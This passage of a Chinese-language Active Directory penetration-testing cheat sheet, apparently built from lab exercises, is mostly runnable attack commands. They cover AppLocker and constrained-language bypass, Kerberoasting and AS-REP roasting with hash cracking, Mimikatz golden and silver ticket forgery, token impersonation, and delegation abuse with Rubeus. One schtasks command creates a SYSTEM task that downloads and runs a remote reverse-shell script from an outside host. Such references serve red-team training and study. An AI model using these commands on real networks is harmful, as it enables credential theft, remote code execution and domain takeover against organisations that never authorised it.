<span class="token comment" spellcheck="true"># ?&amp;#123;&amp;#125; 是一个过滤器语句</span>
Find<span class="token operator">-</span>InterestingDomainAcl <span class="token operator">-</span>ResolveGUIDs <span class="token punctuation">|</span> ?&amp;<span class="token comment" spellcheck="true">#123;$_.IdentityReference -match "Domain Admins"&amp;#125; | select ObjectDN,ActiveDirectoryRights</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h3 id="AppLocker"><a href="#AppLocker" class="headerlink" title="AppLocker"></a>AppLocker</h3><p>识别AppLocker策略。寻找免除的二进制文件或要绕过的路径。</p>
<pre class="line-numbers language-powershell"><code class="language-powershell">Get<span class="token operator">-</span>AppLockerPolicy <span class="token operator">-</span>Effective <span class="token punctuation">|</span> <span class="token function">select</span> <span class="token operator">-</span>ExpandProperty RuleCollections
<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<ul>
<li>一些高级绕过技术：<ul>
<li>如果仅允许使用（Microsoft）签名的二进制文件，请使用<a target="_blank" rel="noopener" href="https://lolbas-project.github.io/">LOLBAS</a>。</li>
<li>如果<code>C:\Windows</code>允许来自的二进制文件，请尝试将您的二进制文件拖放到<code>C:\Windows\Temp</code>或<code>C:\Windows\Tasks</code>。如果此目录树中没有可写的子目录，但存在可写文件，则将文件写入备用数据流（例如JScript脚本），然后从那里执行它。</li>
<li>将您的二进制文件包装在DLL文件中，然后执行<code>rundll32</code>以绕过可执行规则。如果允许使用Python之类的二进制文件，请使用该文件。如果这不起作用，请尝试其他技术，例如将JScript包装在HTA文件中或使用来运行XSL文件<code>wmic</code>。</li>
</ul>
</li>
</ul>
<h3 id="PowerShell受限语言模式"><a href="#PowerShell受限语言模式" class="headerlink" title="PowerShell受限语言模式"></a>PowerShell受限语言模式</h3><p>有时，您可能会发现自己处于执行约束语言模式（CLM）的PowerShell会话中。与AppLocker配对时，通常是这种情况（请参见上文）。</p>
<p>您可以通过轮询以下变量来获取当前的语言模式，从而确定自己处于受限语言模式。<code>FullLanguage</code>对于无限制的会话和<code>ConstrainedLanguage</code>CLM ，它将说。还有其他语言模式，在这里我将不再赘述。</p>
<pre class="line-numbers language-powershell"><code class="language-powershell"><span class="token variable">$ExecutionContext</span><span class="token punctuation">.</span>SessionState<span class="token punctuation">.</span>LanguageMode
<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>CLM构成的约束将阻止您的许多利用尝试。一种快速而肮脏的绕过方法是使用内联函数，该函数有时会起作用-如果例如<code>whoami</code>被阻止，请尝试以下操作：</p>
<pre class="line-numbers language-powershell"><code class="language-powershell">&amp;&amp;<span class="token comment" spellcheck="true">#123;whoami&amp;#125;</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<h3 id="LAPS"><a href="#LAPS" class="headerlink" title="LAPS"></a>LAPS</h3><p>我们可以使用<a target="_blank" rel="noopener" href="https://github.com/leoloobeek/LAPSToolkit/blob/master/LAPSToolkit.ps1">LAPSToolkit.ps1</a>来识别域中的哪些计算机使用LAPS，以及允许哪些域组读取LAPS密码。如果属于此组，则也可以使用此工具获取当前的LAPS密码。</p>
<pre class="line-numbers language-powershell"><code class="language-powershell"><span class="token comment" spellcheck="true"># 获取运行LAPS的计算机及其密码（如果允许我们读取这些密码）</span>
Get<span class="token operator">-</span>LAPSComputers

<span class="token comment" spellcheck="true"># 获取允许读取LAPS密码的组</span>
Find<span class="token operator">-</span>LAPSDelegatedGroups
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h2 id="Exploitation"><a href="#Exploitation" class="headerlink" title="Exploitation"></a>Exploitation</h2><h3 id="Powercat反向shell"><a href="#Powercat反向shell" class="headerlink" title="Powercat反向shell"></a>Powercat反向shell</h3><p>如果您的Linux机壳没有反向外壳，则可以选择;）。</p>
<pre class="line-numbers language-powershell"><code class="language-powershell">powercat <span class="token operator">-</span>l <span class="token operator">-</span>p 443 <span class="token operator">-</span>t 9999
<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<h2 id="横向运动"><a href="#横向运动" class="headerlink" title="横向运动"></a>横向运动</h2><h3 id="使用PowerView进行横向运动枚举"><a href="#使用PowerView进行横向运动枚举" class="headerlink" title="使用PowerView进行横向运动枚举"></a>使用PowerView进行横向运动枚举</h3><pre class="line-numbers language-powershell"><code class="language-powershell"><span class="token comment" spellcheck="true"># 查找用户的现有本地管理员访问权限（noisy 🚩）</span>
Find<span class="token operator">-</span>LocalAdminAccess

<span class="token comment" spellcheck="true"># 通过PS远程处理（also noisy🚩）查找本地管理员访问权限，需要Find-PSRemotingLocalAdminAccess.ps1</span>
Get<span class="token operator">-</span>NetComputer <span class="token operator">-</span>Domain dollarcorp<span class="token punctuation">.</span>moneycorp<span class="token punctuation">.</span>local > <span class="token punctuation">.</span>\targets<span class="token punctuation">.</span>txt
Find<span class="token operator">-</span>PSRemotingLocalAdminAccess <span class="token operator">-</span>ComputerFile <span class="token punctuation">.</span>\targets<span class="token punctuation">.</span>txt dcorp<span class="token operator">-</span>std355

<span class="token comment" spellcheck="true"># 与WMI相同。是否需要“ Find-WMILocalAdminAccess.ps1”（似乎已从Nishang中删除了）？</span>
Find<span class="token operator">-</span>WMILocalAdminAccess <span class="token operator">-</span>ComputerFile <span class="token punctuation">.</span>\targets<span class="token punctuation">.</span>txt
Find<span class="token operator">-</span>WMILocalAdminAccess <span class="token comment" spellcheck="true"># Finds domain computers automatically</span>

<span class="token comment" spellcheck="true"># 在您可以访问的机器上搜寻有趣的用户会话 (still noisy 🚩)</span>
Invoke<span class="token operator">-</span>UserHunter <span class="token operator">-</span>CheckAccess <span class="token punctuation">|</span> ?&amp;<span class="token comment" spellcheck="true">#123;$_.LocalAdmin -Eq True &amp;#125;</span>

<span class="token comment" spellcheck="true"># 寻找 kerberoastable users</span>
Get<span class="token operator">-</span>DomainUser <span class="token operator">-</span>SPN <span class="token punctuation">|</span> <span class="token function">select</span> name<span class="token punctuation">,</span>serviceprincipalname

<span class="token comment" spellcheck="true"># 寻找 AS-REP roastable users</span>
Get<span class="token operator">-</span>DomainUser <span class="token operator">-</span>PreauthNotRequired <span class="token punctuation">|</span> <span class="token function">select</span> name

<span class="token comment" spellcheck="true"># 寻找可以设置UserAccountControl标志的用户</span>
<span class="token comment" spellcheck="true">## 如果可用-禁用预身份验证或添加SPN（请参见下文）</span>
Invoke<span class="token operator">-</span>ACLScanner <span class="token operator">-</span>ResolveGUIDs <span class="token punctuation">|</span> ?&amp;<span class="token comment" spellcheck="true">#123;$_.IdentityReferenceName -match "RDPUsers"&amp;#125;</span>

<span class="token comment" spellcheck="true"># 查找启用了无限制委派的服务器</span>
<span class="token comment" spellcheck="true">## 如果可用，并且您在此服务器上具有管理员权限，请获取用户TGT（请参见下文）</span>
Get<span class="token operator">-</span>DomainComputer <span class="token operator">-</span>Unconstrained

<span class="token comment" spellcheck="true"># 查找启用了约束委派的用户或计算机</span>
<span class="token comment" spellcheck="true">## 如果可用，并且您具有用户/计算机哈希，请以DA身份访问服务机（请参见下文）</span>
Get<span class="token operator">-</span>DomainUser <span class="token operator">-</span>TrustedToAuth <span class="token punctuation">|</span> <span class="token function">select</span> userprincipalname<span class="token punctuation">,</span>msds<span class="token operator">-</span>allowedtodelegateto
Get<span class="token operator">-</span>DomainComputer <span class="token operator">-</span>TrustedToAuth <span class="token punctuation">|</span> <span class="token function">select</span> name<span class="token punctuation">,</span>msds<span class="token operator">-</span>allowedtodelegateto
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h3 id="BloodHound"><a href="#BloodHound" class="headerlink" title="BloodHound"></a>BloodHound</h3><p>使用<code>Invoke-BloodHound</code>from<code>SharpHound.ps1</code>或use <code>SharpHound.exe</code>。两者都可以反思地运行，把它们放到<a target="_blank" rel="noopener" href="https://github.com/BloodHoundAD/BloodHound/tree/master/Collectors">这里</a>。</p>
<pre class="line-numbers language-powershell"><code class="language-powershell"><span class="token comment" spellcheck="true"># 如果您不关心OpSec，请运行所有检查🚩</span>
Invoke<span class="token operator">-</span>BloodHound <span class="token operator">-</span>CollectionMethod All<span class="token punctuation">,</span>GPOLocalGroup

<span class="token comment" spellcheck="true"># Running LoggedOn separately sometimes gives you more sessions, but enumerates by looping through hosts 🚩</span>
Invoke<span class="token operator">-</span>BloodHound <span class="token operator">-</span>CollectionMethod LoggedOn
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h3 id="Kerberoasting"><a href="#Kerberoasting" class="headerlink" title="Kerberoasting"></a>Kerberoasting</h3><h4 id="Automatic"><a href="#Automatic" class="headerlink" title="Automatic"></a>Automatic</h4><p>使用PowerView：</p>
<pre class="line-numbers language-powershell"><code class="language-powershell">Request<span class="token operator">-</span>SPNTicket <span class="token operator">-</span>SPN <span class="token string">"MSSQLSvc/dcorp-mgmt.dollarcorp.moneycorp.local"</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>使用Hashcat破解哈希：</p>
<pre class="line-numbers language-bash"><code class="language-bash">hashcat -a 0 -m 13100 hash.txt <span class="token variable"><span class="token variable">`</span><span class="token function">pwd</span><span class="token variable">`</span></span>/rockyou.txt --rules-file <span class="token variable"><span class="token variable">`</span><span class="token function">pwd</span><span class="token variable">`</span></span>/hashcat/rules/best64.rule
<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<h4 id="Manual"><a href="#Manual" class="headerlink" title="Manual"></a>Manual</h4><pre class="line-numbers language-powershell"><code class="language-powershell"><span class="token comment" spellcheck="true"># 请求TGS进行kerberoastable帐户（SPN）</span>
<span class="token function">Add-Type</span> <span class="token operator">-</span>AssemblyName System<span class="token punctuation">.</span>IdentityModel
<span class="token function">New-Object</span> System<span class="token punctuation">.</span>IdentityModel<span class="token punctuation">.</span>Tokens<span class="token punctuation">.</span>KerberosRequestorSecurityToken <span class="token operator">-</span>ArgumentList <span class="token string">"MSSQLSvc/dcorp-mgmt.dollarcorp.moneycorp.local"</span>

<span class="token comment" spellcheck="true"># 将TGS转储到磁盘</span>
Invoke<span class="token operator">-</span>Mimikatz <span class="token operator">-</span>Command <span class="token string">'"kerberos::list /export"'</span>

<span class="token comment" spellcheck="true"># 使用TGSRepCrack破解</span>
python<span class="token punctuation">.</span>exe <span class="token punctuation">.</span>\tgsrepcrack<span class="token punctuation">.</span>py <span class="token punctuation">.</span>\10k<span class="token operator">-</span>worst<span class="token operator">-</span>pass<span class="token punctuation">.</span>txt <span class="token punctuation">.</span>\mssqlsvc<span class="token punctuation">.</span>kirbi
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h4 id="Targeted-kerberoasting-by-setting-SPN"><a href="#Targeted-kerberoasting-by-setting-SPN" class="headerlink" title="Targeted kerberoasting by setting SPN"></a>Targeted kerberoasting by setting SPN</h4><p>我们需要ACL写入权限才能为该用户设置UserAccountControl标志，有关搜索，请参见上文。使用PowerView：</p>
<pre class="line-numbers language-powershell"><code class="language-powershell"><span class="token function">Set</span><span class="token operator">-</span>DomainObject <span class="token operator">-</span>Identity support355user <span class="token operator">-</span><span class="token function">Set</span> @&amp;<span class="token comment" spellcheck="true">#123;serviceprincipalname='any/thing'&amp;#125;</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<h3 id="AS-REP-roasting"><a href="#AS-REP-roasting" class="headerlink" title="AS-REP roasting"></a>AS-REP roasting</h3><p>获取可焙烤用户的哈希（有关搜索，请参见上文）。使用<code>ASREPRoast.ps1</code>：</p>
<pre class="line-numbers language-powershell"><code class="language-powershell">Get<span class="token operator">-</span>ASREPHash <span class="token operator">-</span>UserName VPN355user
<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>使用Hashcat破解哈希：</p>
<pre class="line-numbers language-bash"><code class="language-bash">hashcat -a 0 -m 18200 hash.txt <span class="token variable"><span class="token variable">`</span><span class="token function">pwd</span><span class="token variable">`</span></span>/rockyou.txt --rules-file <span class="token variable"><span class="token variable">`</span><span class="token function">pwd</span><span class="token variable">`</span></span>/hashcat/rules/best64.rule
<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<h4 id="通过禁用Kerberos预身份验证进行有针对性的AS-REP漫游"><a href="#通过禁用Kerberos预身份验证进行有针对性的AS-REP漫游" class="headerlink" title="通过禁用Kerberos预身份验证进行有针对性的AS-REP漫游"></a><strong>通过禁用Kerberos预身份验证进行有针对性的AS-REP漫游</strong></h4><p>我们需要ACL写入权限才能为该用户设置UserAccountControl标志，有关搜索，请参见上文。使用PowerView。</p>
<pre class="line-numbers language-powershell"><code class="language-powershell"><span class="token function">Set</span><span class="token operator">-</span>DomainObject <span class="token operator">-</span>Identity Control355User <span class="token operator">-XOR</span> @&amp;<span class="token comment" spellcheck="true">#123;useraccountcontrol=4194304&amp;#125;</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<h3 id="Token-Manipulation"><a href="#Token-Manipulation" class="headerlink" title="Token Manipulation"></a>Token Manipulation</h3><p>可以通过计算机上的会话/运行进程从其他用户模仿令牌。通过使用例如CobaltStrike注入到所述过程中可以实现类似的效果。</p>
<h4 id="Incognito"><a href="#Incognito" class="headerlink" title="Incognito"></a>Incognito</h4><pre class="line-numbers language-powershell"><code class="language-powershell"><span class="token comment" spellcheck="true"># 在机器上显示令牌</span>
<span class="token punctuation">.</span>\incognito<span class="token punctuation">.</span>exe list_tokens <span class="token operator">-</span>u

<span class="token comment" spellcheck="true"># 使用特定用户的令牌启动新过程</span>
<span class="token punctuation">.</span>\incognito<span class="token punctuation">.</span>exe execute <span class="token operator">-</span>c <span class="token string">"domain\user"</span> C:\Windows\system32\calc<span class="token punctuation">.</span>exe
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<blockquote>
<p>如果您使用Meterpreter，则可以将内置的Incognito模块与一起使用，可以使用<code>use incognito</code>相同的命令。</p>
</blockquote>
<h4 id="Invoke-TokenManipulation"><a href="#Invoke-TokenManipulation" class="headerlink" title="Invoke-TokenManipulation"></a>Invoke-TokenManipulation</h4><pre class="line-numbers language-powershell"><code class="language-powershell"><span class="token comment" spellcheck="true"># 显示机器上的所有令牌</span>
Invoke<span class="token operator">-</span>TokenManipulation <span class="token operator">-</span>ShowAll

<span class="token comment" spellcheck="true"># 仅在机器上显示唯一的，可用的令牌</span>
Invoke<span class="token operator">-</span>TokenManipulation <span class="token operator">-</span>Enumerate

<span class="token comment" spellcheck="true"># 使用特定用户的令牌启动新过程</span>
Invoke<span class="token operator">-</span>TokenManipulation <span class="token operator">-</span>ImpersonateUser <span class="token operator">-</span>Username <span class="token string">"domain\user"</span>

<span class="token comment" spellcheck="true"># 使用另一个进程的令牌启动新进程</span>
Invoke<span class="token operator">-</span>TokenManipulation <span class="token operator">-</span>CreateProcess <span class="token string">"C:\Windows\system32\calc.exe"</span> <span class="token operator">-</span>ProcessId 500
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h3 id="Mimikatz"><a href="#Mimikatz" class="headerlink" title="Mimikatz"></a>Mimikatz</h3><pre class="line-numbers language-plaintext"><code class="language-plaintext"># Overpass the hash
sekurlsa::pth /user:Administrator /domain:domain.local /ntlm:[NTLMHASH] /run:powershell.exe

# 黄金票据 (domain admin, w/ some ticket properties to avoid detection)
kerberos::golden /user:Administrator /domain:domain.local /sid:S-1-5-21-[DOMAINSID] /krbtgt:[KRBTGTHASH] /id:500 /groups:513,512,520,518,519 /startoffset:0 /endin:600 /renewmax:10080 /ptt

# 白银票据 for a specific SPN with a compromised service / machine account
kerberos::golden /user:Administrator /domain:domain.local /sid:S-1-5-21-[DOMAINSID] /rc4:[MACHINEACCOUNTHASH] /target:dc.domain.local /service:HOST /id:500 /groups:513,512,520,518,519 /startoffset:0 /endin:600 /renewmax:10080 /ptt
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<blockquote>
<p>可在<a target="_blank" rel="noopener" href="https://adsecurity.org/?page_id=183">此处</a>找到用于银票的可用SPN列表。[这里](<a target="_blank" rel="noopener" href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology">https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology</a> and Resources/Active Directory Attack.md#pass-the-ticket-silver-tickets)提供[了](<a target="_blank" rel="noopener" href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology">https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology</a> and Resources/Active Directory Attack.md#pass-the-ticket-silver-tickets)与攻击相关的SPN的另一个不错的概述。</p>
</blockquote>
<h3 id="使用schtasks执行命令"><a href="#使用schtasks执行命令" class="headerlink" title="使用schtasks执行命令"></a><strong>使用schtasks执行命令</strong></h3><p><em>需要“主机” SPN</em></p>
<p>创建任务：</p>
<pre class="line-numbers language-powershell"><code class="language-powershell"><span class="token comment" spellcheck="true"># 注意引号。如果引用变得很痛苦，请使用编码的命令。</span>
schtasks <span class="token operator">/</span>create <span class="token operator">/</span>tn <span class="token string">"shell"</span> <span class="token operator">/</span>ru <span class="token string">"NT Authority\SYSTEM"</span> <span class="token operator">/</span>s dcorp<span class="token operator">-</span>dc<span class="token punctuation">.</span>dollarcorp<span class="token punctuation">.</span>moneycorp<span class="token punctuation">.</span>local <span class="token operator">/</span><span class="token function">sc</span> weekly <span class="token operator">/</span>tr <span class="token string">"Powershell.exe -c 'IEX (New-Object Net.WebClient).DownloadString(''http://172.16.100.55/Invoke-PowerShellTcpRun.ps1''')'"</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p>触发它：</p>
<pre class="line-numbers language-powershell"><code class="language-powershell">schtasks <span class="token operator">/</span>RUN <span class="token operator">/</span>TN <span class="token string">"shell"</span> <span class="token operator">/</span>s dcorp<span class="token operator">-</span>dc<span class="token punctuation">.</span>dollarcorp<span class="token punctuation">.</span>moneycorp<span class="token punctuation">.</span>local
<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<h3 id="使用WMI执行命令"><a href="#使用WMI执行命令" class="headerlink" title="使用WMI执行命令"></a><strong>使用WMI执行命令</strong></h3><p><em>需要“主机”和“ RPCSS” SPN</em></p>
<h4 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h4><pre class="line-numbers language-powershell"><code class="language-powershell"><span class="token function">Invoke-WmiMethod</span> win32_process <span class="token operator">-</span>ComputerName dcorp<span class="token operator">-</span>dc<span class="token punctuation">.</span>dollarcorp<span class="token punctuation">.</span>moneycorp<span class="token punctuation">.</span>local <span class="token operator">-</span>name create <span class="token operator">-</span>argumentlist <span class="token string">"powershell.exe -e <span class="token variable">$encodedCommand</span>"</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<h4 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h4><pre class="line-numbers language-bash"><code class="language-bash"><span class="token comment" spellcheck="true"># 使用password</span>
impacket-wmiexec dcorp/student355:password@172.16.4.101

<span class="token comment" spellcheck="true"># 使用hash</span>
impacket-wmiexec dcorp/student355@172.16.4.101 -hashes :92F4AE6DCDAC7CF870B79F1758503D54
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h3 id="使用PowerShell-Remoting执行命令"><a href="#使用PowerShell-Remoting执行命令" class="headerlink" title="使用PowerShell Remoting执行命令"></a><strong>使用PowerShell Remoting执行命令</strong></h3><p><em>需要“ CIFS”，“ HTTP”和“ WSMAN” SPN</em></p>
<blockquote>
<p>这个有点棘手。上述SPN的组合可能有效或无效-PowerShell也可能要求提供准确的FQDN。</p>
</blockquote>
<pre class="line-numbers language-powershell"><code class="language-powershell"><span class="token comment" spellcheck="true"># 创建凭据以其他用户身份运行（如果需要，PTT不需要）</span>
<span class="token comment" spellcheck="true"># 如果不使用以下命令，请在以下命令中忽略-Credential $ Cred</span>
<span class="token variable">$SecPassword</span> = ConvertTo<span class="token operator">-</span>SecureString <span class="token string">'thePassword'</span> <span class="token operator">-</span>AsPlainText <span class="token operator">-</span>Force
<span class="token variable">$Cred</span> = <span class="token function">New-Object</span> System<span class="token punctuation">.</span>Management<span class="token punctuation">.</span>Automation<span class="token punctuation">.</span>PSCredential<span class="token punctuation">(</span><span class="token string">'CORP\username'</span><span class="token punctuation">,</span> <span class="token variable">$SecPassword</span><span class="token punctuation">)</span>

<span class="token comment" spellcheck="true"># 远程运行命令（可以一对多使用！）</span>
<span class="token function">Invoke-Command</span> <span class="token operator">-</span>Credential <span class="token variable">$Cred</span> <span class="token operator">-</span>ComputerName <span class="token variable">$computer</span> <span class="token operator">-</span>ScriptBlock &amp;<span class="token comment" spellcheck="true">#123;whoami; hostname&amp;#125;</span>

<span class="token comment" spellcheck="true"># 以其他用户身份启动会话（提示输入密码）</span>
<span class="token function">Enter-PsSession</span> <span class="token operator">-</span>Credential <span class="token variable">$Cred</span> <span class="token operator">-</span>ComputerName <span class="token variable">$computer</span> <span class="token operator">-</span>Credential dcorp\Administrator

<span class="token comment" spellcheck="true"># 创建一个持久会话（将记住变量等），将脚本加载到该会话中，然后输入远程会话提示</span>
<span class="token variable">$sess</span> = <span class="token function">New-PsSession</span> <span class="token operator">-</span>Credential <span class="token variable">$Cred</span>
<span class="token function">Invoke-Command</span> <span class="token operator">-</span>Session <span class="token variable">$sess</span> <span class="token operator">-</span>FilePath c:\path\to\file<span class="token punctuation">.</span>ps1
<span class="token function">Enter-PsSession</span> <span class="token operator">-</span>Session <span class="token variable">$sess</span>

<span class="token comment" spellcheck="true"># 在活动的PowerShell远程会话之间复制文件或从中复制文件</span>
<span class="token function">Copy-Item</span> <span class="token operator">-</span>Path <span class="token punctuation">.</span>\Invoke<span class="token operator">-</span>Mimikatz<span class="token punctuation">.</span>ps1 <span class="token operator">-</span>ToSession <span class="token variable">$sess2</span> <span class="token operator">-</span>Destination <span class="token string">"C:\Users\dbprodadmin\documents\"</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h3 id="不受限制的委托"><a href="#不受限制的委托" class="headerlink" title="不受限制的委托"></a><strong>不受限制的委托</strong></h3><p>可以在<em>前端服务</em>（例如IIS Web服务器）上设置，以允许它代表用户委派<em>域中的任何服务</em>（向<em>后端服务</em>（例如MSSQL数据库））。</p>
<p>DACL UAC属性： <code>TrustedForDelegation</code>.</p>
<h4 id="Exploitation-1"><a href="#Exploitation-1" class="headerlink" title="Exploitation"></a>Exploitation</h4><p>在设置了无限制委派的服务器上具有管理特权时，我们可以为具有连接的其他用户转储TGT。使用Mimikatz：</p>
<pre class="line-numbers language-plaintext"><code class="language-plaintext">sekurlsa::tickets /export
kerberos::ptt c:\path\to\ticket.kirbi
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p>或与Rubeus一起使用</p>
<pre class="line-numbers language-powershell"><code class="language-powershell"><span class="token punctuation">.</span>\Rubeus<span class="token punctuation">.</span>exe klist
<span class="token punctuation">.</span>\Rubeus<span class="token punctuation">.</span>exe dump <span class="token operator">/</span>luid:0x5379f2 <span class="token operator">/</span>nowrap
<span class="token punctuation">.</span>\Rubeus<span class="token punctuation">.</span>exe ptt <span class="token operator">/</span>ticket:doIFSDCC<span class="token punctuation">[</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">]</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p>如果该DC容易受到打印机错误的影响，我们还可以获得域控制器计算机帐户的哈希值。在具有无限制委派的服务器上，使用Rubeus监视新票证。</p>
<pre class="line-numbers language-powershell"><code class="language-powershell"><span class="token punctuation">.</span>\Rubeus<span class="token punctuation">.</span>exe monitor <span class="token operator">/</span>interval:5 <span class="token operator">/</span>nowrap
<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>从攻击机上诱使域控制器使用打印机错误进行连接。从<a target="_blank" rel="noopener" href="https://github.com/leechristensen/SpoolSample">这里</a>二进制。</p>
<pre class="line-numbers language-powershell"><code class="language-powershell"><span class="token punctuation">.</span>\MS<span class="token operator">-</span>RPRN<span class="token punctuation">.</span>exe \\dcorp<span class="token operator">-</span>dc<span class="token punctuation">.</span>dollarcorp<span class="token punctuation">.</span>moneycorp<span class="token punctuation">.</span>local \\dcorp<span class="token operator">-</span>appsrv<span class="token punctuation">.</span>dollarcorp<span class="token punctuation">.</span>moneycorp<span class="token punctuation">.</span>local
<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>DC的机器帐户的TGT应该在第一个会话中出现。我们可以传递此票证以获得DCSync特权。</p>
<pre class="line-numbers language-powershell"><code class="language-powershell"><span class="token punctuation">.</span>\Rubeus<span class="token punctuation">.</span>exe ptt <span class="token operator">/</span>ticket:doIFxTCCBc<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<h3 id="约束委派"><a href="#约束委派" class="headerlink" title="约束委派"></a><strong>约束委派</strong></h3><p>可以在<em>前端服务器</em>（例如IIS）上设置约束委派，以允许它代表用户<em>仅</em>委派给<em>选定的后端服务</em>（例如MSSQL）。</p>
<p>DACL UAC属性：<code>TrustedToAuthForDelegation</code>。这允许<code>s4u2self</code>（即，仅使用NTLM密码哈希值）代表<em>任何人</em>自己请求TGS 。这有效地允许该服务仅使用他们的哈希来模拟域中的其他用户，并且在用户和前端之间不使用Kerberos的情况下非常有用。</p>
<p>DACL属性：<code>msDS-AllowedToDelegateTo</code>。此属性包含允许在其上使用的SPN <code>s4u2proxy</code>，即基于现有TGS（例如，从中使用所获得的TGS）请求该服务器的可转发TGS <code>s4u2self</code>。这有效地定义了允许委派委派的后端服务。</p>
<p><strong>注意：</strong>这些属性不一定必须并存！如果<code>s4u2proxy</code>不允许使用<code>s4u2self</code>，则需要用户交互才能从用户获得有效的TGS到前端服务，类似于无约束委派。</p>
<h4 id="Exploitation-2"><a href="#Exploitation-2" class="headerlink" title="Exploitation"></a>Exploitation</h4><p>在这种情况下，我们使用Rubeus自动请求TGT，然后使用带有<code>ldap</code>SPN的TGS，以允许我们使用计算机帐户进行DCSync。</p>
<pre class="line-numbers language-powershell"><code class="language-powershell"><span class="token comment" spellcheck="true"># Get a TGT using the compromised service account with delegation set (if needed)</span>
<span class="token punctuation">.</span>\Rubeus<span class="token punctuation">.</span>exe asktgt <span class="token operator">/</span>user:sa_with_delegation <span class="token operator">/</span>domain:domain<span class="token punctuation">.</span>com <span class="token operator">/</span>rc4:2892D26CDF84D7A70E2EB3B9F05C425E

<span class="token comment" spellcheck="true"># Use s4u2self and s4u2proxy to impersonate the DA user to the allowed SPN</span>
<span class="token punctuation">.</span>\Rubeus<span class="token punctuation">.</span>exe s4u <span class="token operator">/</span>ticket:doIE<span class="token operator">+</span>jCCBP<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span> <span class="token operator">/</span>impersonateuser:Administrator <span class="token operator">/</span>msdsspn:time<span class="token operator">/</span>dc <span class="token operator">/</span>ptt

<span class="token comment" spellcheck="true"># Same as above, but access the LDAP service on the DC (for dcsync) using pw hash</span>
<span class="token punctuation">.</span>\Rubeus<span class="token punctuation">.</span>exe s4u <span class="token operator">/</span>user:sa_with_delegation <span class="token operator">/</span>impersonateuser:Administrator <span class="token operator">/</span>msdsspn:time<span class="token operator">/</span>dc <span class="token operator">/</span>altservice:ldap <span class="token operator">/</span>ptt <span class="token operator">/</span>rc4:2892D26CDF84D7A70E2EB3B9F05C425E
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h3 id="基于资源的约束委派"><a href="#基于资源的约束委派" class="headerlink" title="基于资源的约束委派"></a><strong>基于资源的约束委派</strong></h3><p>基于资源的约束委派（RBCD）将<em>后端服务器</em>（例如MSSQL）配置为<em>仅</em>允许<em>选定的前端服务</em>（例如IIS）代表用户进行委派。这使特定的服务器管理员可以更轻松地配置委派，而无需域管理员权限。</p>
<p>DACL属性：<code>msDS-AllowedToActOnBehalfOfOtherIdentity</code>。</p>
<p>在这种情况下，<code>s4u2self</code>并且和<code>s4u2proxy</code>一样用于代表用户请求可转发票证。但是，使用RBCD，KDC会检查<em>后端服务</em>的属性中是否存在用于请求服务（即<em>前端服务</em>）的SPN 。这意味着<em>前端服务</em>需要设置SPN。因此，必须从具有SPN的服务帐户或计算机帐户对RBC进行攻击。<code>msDS-AllowedToActOnBehalfOfOtherIdentity</code></p>
